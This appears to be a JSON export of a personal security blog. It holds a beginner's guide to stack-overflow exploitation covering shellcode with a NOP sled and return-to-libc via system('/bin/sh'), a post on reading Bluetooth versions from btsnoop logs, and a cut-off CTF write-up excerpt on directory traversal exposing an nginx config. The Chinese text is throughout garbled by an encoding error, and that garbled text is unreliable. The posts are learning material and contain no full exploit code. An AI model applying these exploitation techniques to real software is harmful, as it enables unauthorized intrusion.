{"meta":{"title":"ä»é›¶å¼€å§‹çš„å­¦ä¹ ç”Ÿæ¶¯","subtitle":"FDrag0nçš„å­¦ä¹ ç”Ÿæ¶¯","description":"èœé¸¡å®‰å…¨ç‹—","author":"FDrag0n","url":"http://yoursite.com"},"pages":[{"title":"åˆ†ç±»","date":"2018-01-26T04:42:59.000Z","updated":"2018-01-26T04:50:14.525Z","comments":true,"path":"categories/index.html","permalink":"http://yoursite.com/categories/index.html","excerpt":"","text":""},{"title":"æ ‡ç­¾","date":"2018-01-16T05:07:10.000Z","updated":"2018-01-26T04:50:25.031Z","comments":false,"path":"tags/index.html","permalink":"http://yoursite.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"pwnå…¥é—¨","slug":"pwnå…¥é—¨","date":"2019-09-09T13:44:55.000Z","updated":"2019-09-09T15:30:41.883Z","comments":true,"path":"2019/09/09/pwnå…¥é—¨/","link":"","permalink":"http://yoursite.com/2019/09/09/pwnå…¥é—¨/","excerpt":"","text":"å¸¸è§å¯„å­˜å™¨è¯´æ˜ESPï¼šç”¨æ¥å­˜å‚¨å‡½æ•°è°ƒç”¨æ ˆçš„æ ˆé¡¶åœ°å€ï¼Œåœ¨å‹æ ˆå’Œé€€æ ˆæ—¶å‘ç”Ÿå˜åŒ–ã€‚ EBPï¼šç”¨æ¥å­˜å‚¨å½“å‰å‡½æ•°çŠ¶æ€çš„åŸºåœ°å€ï¼Œåœ¨å‡½æ•°è¿è¡Œæ—¶ä¸å˜ï¼Œå¯ä»¥ç”¨æ¥ç´¢å¼•ç¡®å®šå‡½æ•°å‚æ•°æˆ–å±€éƒ¨å˜é‡çš„ä½ç½®ã€‚ EIPï¼š ç”¨æ¥å­˜å‚¨å³å°†æ‰§è¡Œçš„ç¨‹åºæŒ‡ä»¤çš„åœ°å€ï¼ŒCPUä¾ç…§ EIP çš„å­˜å‚¨å†…å®¹è¯»å–æŒ‡ä»¤å¹¶æ‰§è¡Œï¼ŒEIPéšä¹‹æŒ‡å‘ç›¸é‚»çš„ä¸‹ä¸€æ¡æŒ‡ä»¤ï¼Œå¦‚æ­¤åå¤ï¼Œç¨‹åºå°±å¾—ä»¥è¿ç»­æ‰§è¡ŒæŒ‡ä»¤ã€‚ å‡½æ•°è°ƒç”¨æ—¶æ ˆåŒºå˜åŒ– å‚æ•°é€†åºå…¥æ ˆ å°†è°ƒç”¨å‡½æ•°ï¼ˆcallerï¼‰è¿›è¡Œè°ƒç”¨ä¹‹åçš„ä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€ä½œä¸ºè¿”å›åœ°å€å‹å…¥æ ˆå†…ã€‚è¿™æ ·è°ƒç”¨å‡½æ•°ï¼ˆcallerï¼‰çš„ EIPï¼ˆæŒ‡ä»¤ï¼‰ä¿¡æ¯å¾—ä»¥ä¿å­˜ã€‚ å†å°†å½“å‰çš„EBP å¯„å­˜å™¨çš„å€¼ï¼ˆä¹Ÿå°±æ˜¯è°ƒç”¨å‡½æ•°çš„åŸºåœ°å€ï¼‰å‹å…¥æ ˆå†…ï¼Œå¹¶å°† EBP å¯„å­˜å™¨çš„å€¼æ›´æ–°ä¸ºå½“å‰æ ˆé¡¶çš„åœ°å€ã€‚è¿™æ ·è°ƒç”¨å‡½æ•°ï¼ˆcallerï¼‰çš„ EBP ï¼ˆåŸºåœ°å€ï¼‰ä¿¡æ¯å¾—ä»¥ä¿å­˜ã€‚åŒæ—¶ï¼ŒEBP è¢«æ›´æ–°ä¸ºè¢«è°ƒç”¨å‡½æ•°ï¼ˆcalleeï¼‰çš„åŸºåœ°å€ã€‚ å°†è¢«è°ƒç”¨å‡½æ•°çš„å±€éƒ¨å˜é‡å‹å…¥æ ˆå†…ï¼Œå…¶ä¸­è°ƒç”¨å‚æ•°ä»¥å¤–çš„æ•°æ®å…±åŒæ„æˆäº†è¢«è°ƒç”¨å‡½æ•°ï¼ˆcalleeï¼‰çš„çŠ¶æ€ã€‚åœ¨å‘ç”Ÿè°ƒç”¨æ—¶ï¼Œç¨‹åºè¿˜ä¼šå°†è¢«è°ƒç”¨å‡½æ•°ï¼ˆcalleeï¼‰çš„æŒ‡ä»¤åœ°å€å­˜åˆ° eip å¯„å­˜å™¨å†…ï¼Œè¿™æ ·ç¨‹åºå°±å¯ä»¥ä¾æ¬¡æ‰§è¡Œè¢«è°ƒç”¨å‡½æ•°çš„æŒ‡ä»¤äº†ã€‚ çœ‹è¿‡äº†å‡½æ•°è°ƒç”¨å‘ç”Ÿæ—¶çš„æƒ…å†µï¼Œå°±ä¸éš¾ç†è§£å‡½æ•°è°ƒç”¨ç»“æŸæ—¶çš„å˜åŒ–ã€‚å˜åŒ–çš„æ ¸å¿ƒä»»åŠ¡æ˜¯ä¸¢å¼ƒè¢«è°ƒç”¨å‡½æ•°ï¼ˆcalleeï¼‰çš„çŠ¶æ€ï¼Œå¹¶å°†æ ˆé¡¶æ¢å¤ä¸ºè°ƒç”¨å‡½æ•°ï¼ˆcallerï¼‰çš„çŠ¶æ€ã€‚ é¦–å…ˆè¢«è°ƒç”¨å‡½æ•°çš„å±€éƒ¨å˜é‡ä¼šä»æ ˆå†…ç›´æ¥å¼¹å‡ºï¼Œæ ˆé¡¶ä¼šæŒ‡å‘è¢«è°ƒç”¨å‡½æ•°ï¼ˆcalleeï¼‰çš„åŸºåœ°å€ã€‚ ç„¶åå°†åŸºåœ°å€å†…å­˜å‚¨çš„è°ƒç”¨å‡½æ•°ï¼ˆcallerï¼‰çš„åŸºåœ°å€ä»æ ˆå†…å¼¹å‡ºï¼Œå¹¶å­˜åˆ° EBPå¯„å­˜å™¨å†…ã€‚è¿™æ ·è°ƒç”¨å‡½æ•°ï¼ˆcallerï¼‰çš„ EBPï¼ˆåŸºåœ°å€ï¼‰ä¿¡æ¯å¾—ä»¥æ¢å¤ã€‚æ­¤æ—¶æ ˆé¡¶ä¼šæŒ‡å‘è¿”å›åœ°å€ã€‚ å†å°†è¿”å›åœ°å€ä»æ ˆå†…å¼¹å‡ºï¼Œå¹¶å­˜åˆ° EIP å¯„å­˜å™¨å†…ã€‚è¿™æ ·è°ƒç”¨å‡½æ•°ï¼ˆcallerï¼‰çš„ EIPï¼ˆæŒ‡ä»¤ï¼‰ä¿¡æ¯å¾—ä»¥æ¢å¤ã€‚ æ ˆæº¢å‡ºå½“å‡½æ•°æ­£åœ¨æ‰§è¡Œå†…éƒ¨æŒ‡ä»¤çš„è¿‡ç¨‹ä¸­æˆ‘ä»¬æ— æ³•æ‹¿åˆ°ç¨‹åºçš„æ§åˆ¶æƒï¼Œåªæœ‰åœ¨å‘ç”Ÿå‡½æ•°è°ƒç”¨æˆ–è€…ç»“æŸå‡½æ•°è°ƒç”¨æ—¶ï¼Œç¨‹åºçš„æ§åˆ¶æƒä¼šåœ¨å‡½æ•°çŠ¶æ€ä¹‹é—´å‘ç”Ÿè·³è½¬ï¼Œè¿™æ—¶æ‰å¯ä»¥é€šè¿‡ä¿®æ”¹å‡½æ•°çŠ¶æ€æ¥å®ç°æ”»å‡»ã€‚ æˆ‘ä»¬çš„ç›®æ ‡å°±æ˜¯è®© EIP è½½å…¥æ”»å‡»æŒ‡ä»¤çš„åœ°å€ åœ¨é€€æ ˆè¿‡ç¨‹ä¸­ï¼Œè¿”å›åœ°å€ä¼šè¢«ä¼ ç»™ EIPï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦è®©æº¢å‡ºæ•°æ®ç”¨æ”»å‡»æŒ‡ä»¤çš„åœ°å€æ¥è¦†ç›–è¿”å›åœ°å€å°±å¯ä»¥äº†ã€‚ æˆ‘ä»¬ä¹Ÿå¯ä»¥åœ¨æº¢å‡ºæ•°æ®å†…åŒ…å«ä¸€æ®µæ”»å‡»æŒ‡ä»¤ï¼Œä¹Ÿå¯ä»¥åœ¨å†…å­˜å…¶ä»–ä½ç½®å¯»æ‰¾å¯ç”¨çš„æ”»å‡»æŒ‡ä»¤ã€‚ æˆ‘ä»¬è¦åšçš„å°±æ˜¯å°†åŸæœ¬EIPæŒ‡å®šçš„å‡½æ•°åœ¨è°ƒç”¨æ—¶æ›¿æ¢ä¸ºå…¶ä»–å‡½æ•°ã€‚ æ ˆæº¢å‡ºæŠ€æœ¯ç§ç±» ä¿®æ”¹è¿”å›åœ°å€ï¼Œè®©å…¶æŒ‡å‘æº¢å‡ºæ•°æ®ä¸­çš„ä¸€æ®µæŒ‡ä»¤ï¼ˆshellcodeï¼‰ ä¿®æ”¹è¿”å›åœ°å€ï¼Œè®©å…¶æŒ‡å‘å†…å­˜ä¸­å·²æœ‰çš„æŸä¸ªå‡½æ•°ï¼ˆreturn2libcï¼‰ ä¿®æ”¹è¿”å›åœ°å€ï¼Œè®©å…¶æŒ‡å‘å†…å­˜ä¸­å·²æœ‰çš„ä¸€æ®µæŒ‡ä»¤ï¼ˆROPï¼‰ ä¿®æ”¹æŸä¸ªè¢«è°ƒç”¨å‡½æ•°çš„åœ°å€ï¼Œè®©å…¶æŒ‡å‘å¦ä¸€ä¸ªå‡½æ•°ï¼ˆhijack GOTï¼‰ shellcodepayload : padding1 + address of shellcode + padding2 + shellcode padding1 å¤„çš„æ•°æ®å¯ä»¥éšæ„å¡«å……ï¼ˆæ³¨æ„å¦‚æœåˆ©ç”¨å­—ç¬¦ä¸²ç¨‹åºè¾“å…¥æº¢å‡ºæ•°æ®ä¸è¦åŒ…å« â€œ\\x00â€ ï¼Œå¦åˆ™å‘ç¨‹åºä¼ å…¥æº¢å‡ºæ•°æ®æ—¶ä¼šé€ æˆæˆªæ–­ï¼‰ï¼Œé•¿åº¦åº”è¯¥åˆšå¥½è¦†ç›–å‡½æ•°çš„åŸºåœ°å€ã€‚address of shellcode æ˜¯åé¢ shellcode èµ·å§‹å¤„çš„åœ°å€ï¼Œç”¨æ¥è¦†ç›–è¿”å›åœ°å€ã€‚padding2 å¤„çš„æ•°æ®ä¹Ÿå¯ä»¥éšæ„å¡«å……ï¼Œé•¿åº¦å¯ä»¥ä»»æ„ã€‚shellcode åº”è¯¥ä¸ºåå…­è¿›åˆ¶çš„æœºå™¨ç æ ¼å¼ã€‚ æ ¹æ®ä¸Šé¢çš„æ„é€ ï¼Œæˆ‘ä»¬è¦è§£å†³ä¸¤ä¸ªé—®é¢˜ã€‚ è¿”å›åœ°å€ä¹‹å‰çš„å¡«å……æ•°æ®ï¼ˆpadding1ï¼‰åº”è¯¥å¤šé•¿ï¼Ÿ æˆ‘ä»¬å¯ä»¥ç”¨è°ƒè¯•å·¥å…·ï¼ˆä¾‹å¦‚ gdbï¼‰æŸ¥çœ‹æ±‡ç¼–ä»£ç æ¥ç¡®å®šè¿™ä¸ªè·ç¦»ï¼Œä¹Ÿå¯ä»¥åœ¨è¿è¡Œç¨‹åºæ—¶ç”¨ä¸æ–­å¢åŠ è¾“å…¥é•¿åº¦çš„æ–¹æ³•æ¥è¯•æ¢ï¼ˆå¦‚æœè¿”å›åœ°å€è¢«æ— æ•ˆåœ°å€ä¾‹å¦‚â€œAAAAâ€è¦†ç›–ï¼Œç¨‹åºä¼šç»ˆæ­¢å¹¶æŠ¥é”™ï¼‰ã€‚ shellcodeèµ·å§‹åœ°å€åº”è¯¥æ˜¯å¤šå°‘ï¼Ÿ æˆ‘ä»¬å¯ä»¥åœ¨è°ƒè¯•å·¥å…·é‡ŒæŸ¥çœ‹è¿”å›åœ°å€çš„ä½ç½®ï¼ˆå¯ä»¥æŸ¥çœ‹ EBP çš„å†…å®¹ç„¶åå†åŠ 4ï¼ˆ32ä½æœºï¼‰ï¼Œå‚è§å‰é¢å…³äºå‡½æ•°çŠ¶æ€çš„è§£é‡Šï¼‰ï¼Œå¯æ˜¯åœ¨è°ƒè¯•å·¥å…·é‡Œçš„è¿™ä¸ªåœ°å€å’Œæ­£å¸¸è¿è¡Œæ—¶å¹¶ä¸ä¸€è‡´ï¼Œè¿™æ˜¯è¿è¡Œæ—¶ç¯å¢ƒå˜é‡ç­‰å› ç´ æœ‰æ‰€ä¸åŒé€ æˆçš„ã€‚æ‰€ä»¥è¿™ç§æƒ…å†µä¸‹æˆ‘ä»¬åªèƒ½å¾—åˆ°å¤§è‡´ä½†ä¸ç¡®åˆ‡çš„ shellcode èµ·å§‹åœ°å€ï¼Œè§£å†³åŠæ³•æ˜¯åœ¨ padding2 é‡Œå¡«å……è‹¥å¹²é•¿åº¦çš„ â€œ\\x90â€ã€‚è¿™ä¸ªæœºå™¨ç å¯¹åº”çš„æŒ‡ä»¤æ˜¯ NOP (No Operation)ï¼Œä¹Ÿå°±æ˜¯å‘Šè¯‰ CPU ä»€ä¹ˆä¹Ÿä¸åšï¼Œç„¶åè·³åˆ°ä¸‹ä¸€æ¡æŒ‡ä»¤ã€‚æœ‰äº†è¿™ä¸€æ®µ NOP çš„å¡«å……ï¼Œåªè¦è¿”å›åœ°å€èƒ½å¤Ÿå‘½ä¸­è¿™ä¸€æ®µä¸­çš„ä»»æ„ä½ç½®ï¼Œéƒ½å¯ä»¥æ— å‰¯ä½œç”¨åœ°è·³è½¬åˆ° shellcode çš„èµ·å§‹å¤„ï¼Œæ‰€ä»¥è¿™ç§æ–¹æ³•è¢«ç§°ä¸º NOP Sledï¼ˆä¸­æ–‡å«ä¹‰æ˜¯â€œæ»‘é›ªæ©‡â€ï¼‰ã€‚è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡å¢åŠ  NOP å¡«å……æ¥é…åˆè¯•éªŒ shellcode èµ·å§‹åœ°å€ã€‚ æ“ä½œç³»ç»Ÿå¯ä»¥å°†å‡½æ•°è°ƒç”¨æ ˆçš„èµ·å§‹åœ°å€è®¾ä¸ºéšæœºåŒ–ï¼ˆè¿™ç§æŠ€æœ¯è¢«ç§°ä¸ºå†…å­˜å¸ƒå±€éšæœºåŒ–ï¼Œå³Address Space Layout Randomization (ASLR) ï¼‰ï¼Œè¿™æ ·ç¨‹åºæ¯æ¬¡è¿è¡Œæ—¶å‡½æ•°è¿”å›åœ°å€ä¼šéšæœºå˜åŒ–ã€‚åä¹‹å¦‚æœæ“ä½œç³»ç»Ÿå…³é—­äº†ä¸Šè¿°çš„éšæœºåŒ–ï¼ˆè¿™æ˜¯æŠ€æœ¯å¯ä»¥ç”Ÿæ•ˆçš„å‰æï¼‰ï¼Œé‚£ä¹ˆç¨‹åºæ¯æ¬¡è¿è¡Œæ—¶å‡½æ•°è¿”å›åœ°å€ä¼šæ˜¯ç›¸åŒçš„ï¼Œè¿™æ ·æˆ‘ä»¬å¯ä»¥é€šè¿‡è¾“å…¥æ— æ•ˆçš„æº¢å‡ºæ•°æ®æ¥ç”Ÿæˆcoreæ–‡ä»¶ï¼Œå†é€šè¿‡è°ƒè¯•å·¥å…·åœ¨coreæ–‡ä»¶ä¸­æ‰¾åˆ°è¿”å›åœ°å€çš„ä½ç½®ï¼Œä»è€Œç¡®å®š shellcode çš„èµ·å§‹åœ°å€ã€‚ è§£å†³å®Œä¸Šè¿°é—®é¢˜ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ‹¼æ¥å‡ºæœ€ç»ˆçš„æº¢å‡ºæ•°æ®ï¼Œè¾“å…¥è‡³ç¨‹åºæ¥æ‰§è¡Œ shellcode äº†ã€‚ è¿™ç§æ–¹æ³•ç”Ÿæ•ˆçš„ä¸€ä¸ªå‰ææ˜¯åœ¨å‡½æ•°è°ƒç”¨æ ˆä¸Šçš„æ•°æ®ï¼ˆshellcodeï¼‰è¦æœ‰å¯æ‰§è¡Œçš„æƒé™ï¼ˆå¦ä¸€ä¸ªå‰ææ˜¯ä¸Šé¢æåˆ°çš„å…³é—­å†…å­˜å¸ƒå±€éšæœºåŒ–ï¼‰ã€‚å¾ˆå¤šæ—¶å€™æ“ä½œç³»ç»Ÿä¼šå…³é—­å‡½æ•°è°ƒç”¨æ ˆçš„å¯æ‰§è¡Œæƒé™ï¼Œè¿™æ · shellcode çš„æ–¹æ³•å°±å¤±æ•ˆäº†ï¼Œä¸è¿‡æˆ‘ä»¬è¿˜å¯ä»¥å°è¯•ä½¿ç”¨å†…å­˜é‡Œå·²æœ‰çš„æŒ‡ä»¤æˆ–å‡½æ•°ï¼Œæ¯•ç«Ÿè¿™äº›éƒ¨åˆ†æœ¬æ¥å°±æ˜¯å¯æ‰§è¡Œçš„ï¼Œæ‰€ä»¥ä¸ä¼šå—ä¸Šè¿°æ‰§è¡Œæƒé™çš„é™åˆ¶ã€‚è¿™å°±åŒ…æ‹¬ return2libc å’Œ ROP ä¸¤ç§æ–¹æ³•ã€‚ Return2libcåœ¨å†…å­˜ä¸­ç¡®å®šæŸä¸ªå‡½æ•°çš„åœ°å€ï¼Œå¹¶ç”¨å…¶è¦†ç›–æ‰è¿”å›åœ°å€ã€‚ç”±äº libc åŠ¨æ€é“¾æ¥åº“ä¸­çš„å‡½æ•°è¢«å¹¿æ³›ä½¿ç”¨ï¼Œæ‰€ä»¥æœ‰å¾ˆå¤§æ¦‚ç‡å¯ä»¥åœ¨å†…å­˜ä¸­æ‰¾åˆ°è¯¥åŠ¨æ€åº“ã€‚åŒæ—¶ç”±äºè¯¥åº“åŒ…å«äº†ä¸€äº›ç³»ç»Ÿçº§çš„å‡½æ•°ï¼ˆä¾‹å¦‚ system() ç­‰ï¼‰ï¼Œæ‰€ä»¥é€šå¸¸ä½¿ç”¨è¿™äº›ç³»ç»Ÿçº§å‡½æ•°æ¥è·å¾—å½“å‰è¿›ç¨‹çš„æ§åˆ¶æƒã€‚é‰´äºè¦æ‰§è¡Œçš„å‡½æ•°å¯èƒ½éœ€è¦å‚æ•°ï¼Œæ¯”å¦‚è°ƒç”¨ system() å‡½æ•°æ‰“å¼€ shell çš„å®Œæ•´å½¢å¼ä¸º system(â€œ/bin/shâ€) ï¼Œæ‰€ä»¥æº¢å‡ºæ•°æ®ä¹Ÿè¦åŒ…æ‹¬å¿…è¦çš„å‚æ•°ã€‚ä¸‹é¢å°±ä»¥æ‰§è¡Œ system(â€œ/bin/shâ€) ä¸ºä¾‹ï¼Œå…ˆå†™å‡ºæº¢å‡ºæ•°æ®çš„ç»„æˆï¼Œå†ç¡®å®šå¯¹åº”çš„å„éƒ¨åˆ†å¡«å……è¿›å»ã€‚ payload: padding1 + address of system() + padding2 + address of â€œ/bin/shâ€ padding1 å¤„çš„æ•°æ®å¯ä»¥éšæ„å¡«å……ï¼ˆæ³¨æ„ä¸è¦åŒ…å« â€œ\\x00â€ ï¼Œå¦åˆ™å‘ç¨‹åºä¼ å…¥æº¢å‡ºæ•°æ®æ—¶ä¼šé€ æˆæˆªæ–­ï¼‰ï¼Œé•¿åº¦åº”è¯¥åˆšå¥½è¦†ç›–å‡½æ•°çš„åŸºåœ°å€ã€‚address of system() æ˜¯ system() åœ¨å†…å­˜ä¸­çš„åœ°å€ï¼Œç”¨æ¥è¦†ç›–è¿”å›åœ°å€ã€‚padding2 å¤„çš„æ•°æ®é•¿åº¦ä¸º4ï¼ˆ32ä½æœºï¼‰ï¼Œå¯¹åº”è°ƒç”¨ system() æ—¶çš„è¿”å›åœ°å€ã€‚å› ä¸ºæˆ‘ä»¬åœ¨è¿™é‡Œåªéœ€è¦æ‰“å¼€ shell å°±å¯ä»¥ï¼Œå¹¶ä¸å…³å¿ƒä» shell é€€å‡ºä¹‹åçš„è¡Œä¸ºï¼Œæ‰€ä»¥ padding2 çš„å†…å®¹å¯ä»¥éšæ„å¡«å……ã€‚address of â€œ/bin/shâ€ æ˜¯å­—ç¬¦ä¸² â€œ/bin/shâ€ åœ¨å†…å­˜ä¸­çš„åœ°å€ï¼Œä½œä¸ºä¼ ç»™ system() çš„å‚æ•°ã€‚ æ ¹æ®ä¸Šé¢çš„æ„é€ ï¼Œæˆ‘ä»¬è¦è§£å†³ä¸ªé—®é¢˜ã€‚ è¿”å›åœ°å€ä¹‹å‰çš„å¡«å……æ•°æ®ï¼ˆpadding1ï¼‰åº”è¯¥å¤šé•¿ï¼Ÿ è§£å†³æ–¹æ³•å’Œ shellcode ä¸­æåˆ°çš„ç­”æ¡ˆä¸€æ ·ã€‚ system() å‡½æ•°åœ°å€åº”è¯¥æ˜¯å¤šå°‘ï¼Ÿ è¦å›ç­”è¿™ä¸ªé—®é¢˜ï¼Œå°±è¦çœ‹çœ‹ç¨‹åºæ˜¯å¦‚ä½•è°ƒç”¨åŠ¨æ€é“¾æ¥åº“ä¸­çš„å‡½æ•°çš„ã€‚å½“å‡½æ•°è¢«åŠ¨æ€é“¾æ¥è‡³ç¨‹åºä¸­ï¼Œç¨‹åºåœ¨è¿è¡Œæ—¶é¦–å…ˆç¡®å®šåŠ¨æ€é“¾æ¥åº“åœ¨å†…å­˜çš„èµ·å§‹åœ°å€ï¼Œå†åŠ ä¸Šå‡½æ•°åœ¨åŠ¨æ€åº“ä¸­çš„ç›¸å¯¹åç§»é‡ï¼Œæœ€ç»ˆå¾—åˆ°å‡½æ•°åœ¨å†…å­˜çš„ç»å¯¹åœ°å€ã€‚è¯´åˆ°ç¡®å®šåŠ¨æ€åº“çš„å†…å­˜åœ°å€ï¼Œå°±è¦å›é¡¾ä¸€ä¸‹ shellcode ä¸­æåˆ°çš„å†…å­˜å¸ƒå±€éšæœºåŒ–ï¼ˆASLRï¼‰ï¼Œè¿™é¡¹æŠ€æœ¯ä¹Ÿä¼šå°†åŠ¨æ€åº“åŠ è½½çš„èµ·å§‹åœ°å€åšéšæœºåŒ–å¤„ç†ã€‚æ‰€ä»¥ï¼Œå¦‚æœæ“ä½œç³»ç»Ÿæ‰“å¼€äº† ASLRï¼Œç¨‹åºæ¯æ¬¡è¿è¡Œæ—¶åŠ¨æ€åº“çš„èµ·å§‹åœ°å€éƒ½ä¼šå˜åŒ–ï¼Œä¹Ÿå°±æ— ä»ç¡®å®šåº“å†…å‡½æ•°çš„ç»å¯¹åœ°å€ã€‚åœ¨ ASLR è¢«å…³é—­çš„å‰æä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è°ƒè¯•å·¥å…·åœ¨è¿è¡Œç¨‹åºè¿‡ç¨‹ä¸­ç›´æ¥æŸ¥çœ‹ system() çš„åœ°å€ï¼Œä¹Ÿå¯ä»¥æŸ¥çœ‹åŠ¨æ€åº“åœ¨å†…å­˜çš„èµ·å§‹åœ°å€ï¼Œå†åœ¨åŠ¨æ€åº“å†…æŸ¥çœ‹å‡½æ•°çš„ç›¸å¯¹åç§»ä½ç½®ï¼Œé€šè¿‡è®¡ç®—å¾—åˆ°å‡½æ•°çš„ç»å¯¹åœ°å€ã€‚ æœ€åï¼Œâ€œ/bin/shâ€ çš„åœ°å€åœ¨å“ªé‡Œï¼Ÿ å¯ä»¥åœ¨åŠ¨æ€åº“é‡Œæœç´¢è¿™ä¸ªå­—ç¬¦ä¸²ï¼Œå¦‚æœå­˜åœ¨ï¼Œå°±å¯ä»¥æŒ‰ç…§åŠ¨æ€åº“èµ·å§‹åœ°å€ï¼‹ç›¸å¯¹åç§»æ¥ç¡®å®šå…¶ç»å¯¹åœ°å€ã€‚å¦‚æœåœ¨åŠ¨æ€åº“é‡Œæ‰¾ä¸åˆ°ï¼Œå¯ä»¥å°†è¿™ä¸ªå­—ç¬¦ä¸²åŠ åˆ°ç¯å¢ƒå˜é‡é‡Œï¼Œå†é€šè¿‡ getenv() ç­‰å‡½æ•°æ¥ç¡®å®šåœ°å€ã€‚ è§£å†³å®Œä¸Šè¿°é—®é¢˜ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ‹¼æ¥å‡ºæº¢å‡ºæ•°æ®ï¼Œè¾“å…¥è‡³ç¨‹åºæ¥é€šè¿‡ system() æ‰“å¼€ shell äº†ã€‚ ä»¥ä¸Šä¸¤ç§æ–¹æ¡ˆéƒ½éœ€è¦æ“ä½œç³»ç»Ÿå…³é—­å¸ƒå±€éšæœºåŒ–ï¼ˆASLRï¼‰ä¸¤ç§æ–¹æ³•éƒ½æ˜¯é€šè¿‡è¦†ç›–è¿”å›åœ°å€æ¥æ‰§è¡Œè¾“å…¥çš„æŒ‡ä»¤ç‰‡æ®µï¼ˆshellcodeï¼‰æˆ–è€…åŠ¨æ€åº“ä¸­çš„å‡½æ•°ï¼ˆreturn2libcï¼‰ã€‚éœ€è¦æŒ‡å‡ºçš„æ˜¯ï¼Œè¿™ä¸¤ç§æ–¹æ³•éƒ½éœ€è¦æ“ä½œç³»ç»Ÿå…³é—­å†…å­˜å¸ƒå±€éšæœºåŒ–ï¼ˆASLRï¼‰ï¼Œè€Œä¸” shellcode è¿˜éœ€è¦ç¨‹åºè°ƒç”¨æ ˆæœ‰å¯æ‰§è¡Œæƒé™ã€‚ ä¸‹é¢çš„å¦å¤–ä¸¤ç§æ‰§è¡Œæ–¹æ³•ï¼Œå…¶ä¸­æœ‰å¯ä»¥ç»•è¿‡å†…å­˜å¸ƒå±€éšæœºåŒ–ï¼ˆASLRï¼‰çš„æ–¹æ³•ï¼Œæ•¬è¯·å…³æ³¨ã€‚","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://yoursite.com/tags/pwn/"}]},{"title":"è·å–ä½ è€³æœºçš„è“ç‰™ç‰ˆæœ¬","slug":"è·å–ä½ è€³æœºçš„è“ç‰™ç‰ˆæœ¬","date":"2019-08-27T07:34:55.000Z","updated":"2019-08-27T07:56:54.374Z","comments":true,"path":"2019/08/27/è·å–ä½ è€³æœºçš„è“ç‰™ç‰ˆæœ¬/","link":"","permalink":"http://yoursite.com/2019/08/27/è·å–ä½ è€³æœºçš„è“ç‰™ç‰ˆæœ¬/","excerpt":"","text":"è“ç‰™è€³æœºåœ¨å„å¤§æ‰‹æœºå‚å¹²æ‰äº†è€³æœºå£ä¹‹åï¼Œä»–ä»¬å°±å¯ä»¥æ›´å¥½åœ°å–è“ç‰™è€³æœºäº†ã€‚ å„å¤§ï¼Œå–ç‚¹ä¹Ÿå‡ºæ¥äº†ï¼Œä»€ä¹ˆTWSï¼Œè“ç‰™5.0ï¼Œaptxï¼Œaacï¼Œldacç­‰ç­‰ TWSï¼šä¸ºTrue Wireless Stereoçš„ç¼©å†™ï¼Œæ˜¯çœŸæ­£æ— çº¿ç«‹ä½“å£° è“ç‰™5.0ï¼šäºç¾å›½æ—¶é—´2016å¹´6æœˆ16æ—¥åœ¨ä¼¦æ•¦æ­£å¼å‘å¸ƒ,ä¸ºç°é˜¶æ®µæœ€é«˜çº§çš„è“ç‰™åè®®æ ‡å‡†ã€‚ ä½†æ˜¯æ€ä¹ˆçŸ¥é“ä¸€æ¬¾è€³æœºåˆ°åº•æ˜¯ä¸æ˜¯è“ç‰™5.0å‘¢ï¼Ÿè€Œå®ƒå…·ä½“çš„èŠ¯ç‰‡æ˜¯å“ªä¸€æ¬¾å‘¢ï¼Ÿè¿™äº›å¾ˆå¤šå‚å®¶éƒ½ä¸ä¼šå‘Šè¯‰ä½ ã€‚ è·å–ä½ è€³æœºçš„è“ç‰™ç‰ˆæœ¬ ä»¥å°ç±³æ‰‹æœºä¸ºä¾‹ï¼Œå¼€å¯å¼€å‘è€…æ¨¡å¼çš„è“ç‰™æŠ“åŒ…æ—¥å¿— å¦‚å›¾ä¸Šç™½ç‚¹å¤„ï¼Œå„æ‰‹æœºæ“ä½œå·®ä¸å¤š å°†ç³»ç»Ÿå­˜å‚¨ç›®å½•ä¸‹çš„./MUIU/debug_log/common/btsnoop_hci.logï¼ˆä¸åŒçš„æ‰‹æœºè¿™ä¸ªæ–‡ä»¶çš„ä½ç½®ä¸åŒï¼Œå¯ä»¥è‡ªè¡Œæœç´¢ç¡®è®¤ã€‚è¿˜æœ‰çš„æ‰‹æœºå¯èƒ½éœ€è¦rootæƒé™ï¼Œåœ¨/data/misc/bluetooth/logsä¸‹é¢ï¼‰æ–‡ä»¶å‘é€è‡³ç”µè„‘ ä½¿ç”¨wiresharkæ‰“å¼€æ—¥å¿—æ–‡ä»¶ï¼Œæœç´¢Read Remote Version Information Complete åœ¨çº¢çº¿çš„ä½ç½®å³å¯æŸ¥çœ‹ç›®æ ‡è®¾å¤‡çš„è“ç‰™ç‰ˆæœ¬å·å’ŒèŠ¯ç‰‡å‚å®¶ åè®®çš„æ–‡æ¡£è¯»çš„å¤´ç–¼ï¼Œå‰©ä¸‹çš„å¯èƒ½æ‡’å¾—çœ‹äº†0.0","categories":[],"tags":[]},{"title":"35C3-POST","slug":"2019-4-19-35C3-POST","date":"2019-04-19T02:47:49.000Z","updated":"2019-12-05T13:20:02.462Z","comments":true,"path":"2019/04/19/2019-4-19-35C3-POST/","link":"","permalink":"http://yoursite.com/2019/04/19/2019-4-19-35C3-POST/","excerpt":"35C3-POSTæ‰«æç›®å½•å¾—åˆ°uploadsç›®å½•ï¼Œæµ‹è¯•ç›®å½•ç©¿è¶ŠæˆåŠŸï¼Œå¾—åˆ°nginxå¤‡ä»½æ–‡ä»¶å’Œæºç  12345678910111213141516171819202122232425262728293031323334353637383940414243444546server &#123; listen 80; access_log /var/log/nginx/example.log; server_name localhost; root /var/www/html; location /uploads &#123; autoindex on; alias /var/www/uploads/; &#125; location / &#123; alias /var/www/html/; index index.php; location ~ \\.php$ &#123; include snippets/fastcgi-php.conf; fastcgi_pass unix:/run/php/php7.2-fpm.sock; &#125; &#125; location /inc/ &#123; deny all; &#125;&#125;server &#123; listen 127.0.0.1:8080; access_log /var/log/nginx/proxy.log; if ( $request_method !~ ^(GET)$ ) &#123; return 405; &#125; root /var/www/miniProxy; location / &#123; index index.php; location ~ \\.php$ &#123; include snippets/fastcgi-php.conf; fastcgi_pass unix:/run/php/php7.2-fpm.sock; &#125; &#125; 